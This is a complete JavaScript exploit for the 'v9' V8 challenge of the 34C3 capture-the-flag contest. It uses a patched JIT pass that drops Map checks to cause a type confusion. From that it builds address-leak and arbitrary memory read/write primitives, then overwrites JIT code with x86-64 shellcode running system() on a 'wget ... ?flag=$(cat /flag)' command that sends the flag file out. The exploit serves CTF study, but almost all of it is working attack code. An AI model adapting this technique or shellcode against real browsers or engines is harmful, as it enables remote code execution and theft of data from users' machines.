//
// Exploit for "v9" of 34C3CTF.
//
// Copyright (c) 2017 Samuel Groß
//
//
// Overview:
//
// The patch modified the redundancy elimination phase of the JIT compiler to
// also include Map checks. This is unsafe as the redundancy elimination pass
// does *not* take into account effectful operations such as execution of other
// JavaScript functions in between checks. Since JS code can change the Map of
// a JSObject, we essentially end up with a type confusion.
//
// The correct way to elimination redundant Map checks is implemented in the
// load elimination phase.
//

/// We need to manually trigger GC at a few points to move objects whose
/// address we are going to leak to their final location on Old Space.
function gc() {
    var i = 0;
    for (var i = 0; i < 10000; i++) {
        // Random code to trick the optimizer...
        var a = [1,2,i,3,4];
        i += a.sort()[0];
    }
}

function get_rw() {
    /// First primitive: leak the address of a HeapObject.
    /// This works by generating JIT code that reads a UnboxedDouble
    /// from a fixed offset into an object, then changing that slot
    /// to contain a HeapObject instead.
    ///
    /// Note: this and the following function only works once, then would have to be recompiled.
    /// This is due to the fact that the used Map permanently transitions
    /// to a different format once we change the type of the property.
    function addrof(target) {
        function hax(o, cb) {
            // Generate first MapCheck
            var a = o.a;
            // This callback could change the Map ...
            cb(a);
            // ... but this MapCheck will still be removed ¯\_(ツ)_/¯
            return o.b;
        }

        // Force JIT compilation...
        var o = {a: 0.1337, b: 13.37};
        for (var i = 0; i < 100000; i++) {
            hax(o, function(a) { return a + i; });
        }

        // ... and trigger the bug
        var o = {a: 13.37, b: 13.37};
        var r = hax(o, function(a) {
            o.b = target;
        });
        return Int64.fromDouble(r);
    }


    /// Second primitive: overwrite the |properties| pointer of
    /// a JSObject with a controlled double value.
    /// This works by generating JIT code that assigns to a property of type HeapNumber,
    /// which is a pointer to a (Map*, double) structure. Then, in the callback,
    /// we change the property to a JSObject*, which will then cause its |properties|
    /// array (which is at the same offset as the double value of a HeapNumber)
    /// to be overwritten.
    function corrupt_properties_pointer(target, value) {
        var dVal = value.asDouble();
        function hax(o, cb) {
            var a = o.c;
            cb(a);
            o.d = dVal;
            return o.d;
        }

        var o = {c: 1};
        // Added properties are stored as HeapNumber right away (as opposed to unboxed double).
        o.d = 13.37;

        for (var i = 0; i < 100000; i++) {
            hax(o, function(a) { return a + i; });
        }

        var o = {c: 0};
        o.d = 13.37;
        var r = hax(o, function() {
            o.d = target;
        });
    }

    /// Overview:
    ///
    /// We exploit the bug 2 times: the first time to leak the address of an ArrayBuffer instance
    /// and the second time to overwrite the pointer to the properties array of an object with the address
    /// of that ArrayBuffer. After that, we simply set a property on the corrupted object
    /// which will now overwrite the pointer to the ArrayBuffer's backing buffer with the address
    /// of a second ArrayBuffer. We now have a scenario in which an ArrayBuffer points to a second
    /// one, giving us easy arbitrary read/write into the process' memory space.
    ///

    var memview_buf = new ArrayBuffer(1024);
    var driver_buf = new ArrayBuffer(1024);

    // Must trigger GC now so driver_buf is promoted to old space and is not moved around anymore (which would invalidate our leaked address).
    gc();

    var buf_addr = addrof(driver_buf);
    console.log("Driver @ " + buf_addr);

    var victim = {inline: 42};
    // Force out-of-line storage
    victim.offset0  = {};
    victim.offset8  = {};
    victim.offset16 = {};

    // Corrupt the victim object and have its properties array
    // point to our ArrayBuffer object.
    corrupt_properties_pointer(victim, buf_addr);

    // Since the properties array is now aliased to an ArrayBuffer instance,
    // offset 16 holds the pointer to the ArrayBuffer's backing buffer.
    victim.offset16 = memview_buf;

    var driver = new Uint8Array(driver_buf);

    return {
        write(addr, data) {
            driver.set(addr.bytes(), 31);
            var memview = new Uint8Array(memview_buf);
            memview.set(data);
        },
        read(addr, len) {
            driver.set(addr.bytes(), 31);
            var memview = new Uint8Array(memview_buf);
            return memview.subarray(0, len);
        },
        readPtr(addr) {
            return new Int64(this.read(addr, 8));
        },
        addrof(obj) {
            driver_buf.leakMe = obj;
            var props = this.readPtr(Add(buf_addr, 7));
            var addr = this.readPtr(Add(props, 15));
            addr.assignSub(addr, 1);
            return addr;
        },
    };
}

function pwn() {
    var cmdbuf = new Uint8Array(new ArrayBuffer(0x10000));
    function run_shellcode(x) {
        // Not (yet) the real run_shellcode ;)
        return x + 42;
    }
    for (var i = 0; i < 100000; i++) {
        run_shellcode(i);
    }

    var memory = get_rw();
    console.log("Got memory read/write!");

    var command = cmdbuf.set(Array.from('wget "' + document.origin + '/?flag=$(cat /flag)"').map((c) => c.charCodeAt(0)));
    var buf_addr = memory.addrof(cmdbuf.buffer);
    console.log("Buffer @ " + buf_addr);
    var cmd_addr = memory.readPtr(Add(buf_addr, 32));
    console.log("Shell command @ " + cmd_addr);

	// Shellcode is basically `system(cmd_addr);`
    var shellcode = [].concat([72,49,210,72,184,47,98,105,110,47,115,104,0,80,72,137,231,184,45,99,0,0,80,72,137,225,72,184], Array.from(cmd_addr.bytes()), [82,80,81,87,72,137,230,184,59,0,0,0,15,5]);

	// Replace JIT code with shellcode and call into it.
    var func_addr = memory.addrof(run_shellcode);
    console.log("Function @ " + func_addr);
    var code_addr = memory.readPtr(Add(func_addr, 56));
    var jitcode_addr = Add(code_addr, 95);

    console.log("JIT code @ " + jitcode_addr);

    memory.write(jitcode_addr, shellcode);

    run_shellcode();
}
